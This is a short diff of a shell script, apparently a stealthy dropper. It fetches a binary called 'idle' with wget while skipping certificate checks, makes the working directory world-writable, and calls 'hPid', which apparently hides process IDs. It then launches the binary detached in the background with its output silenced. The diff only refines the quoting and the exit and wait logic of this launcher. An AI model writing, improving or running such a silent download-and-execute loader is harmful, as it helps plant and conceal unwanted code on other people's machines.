@@ -17,7 +17,7 @@ wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
 
 hPid "$$"
-nohup setsid /bin/sh -c "cd ${work}; exec ./idle" </dev/null >/dev/null 2>&1 &
+nohup setsid /bin/sh -c 'cd "$1"; exec ./idle' /bin/sh "${work}" </dev/null >/dev/null 2>&1 &
 hPid "$!"
-[ "$mode" == "1" ] && wait
-
+[ "$mode" != "0" ] && wait
+exit 0
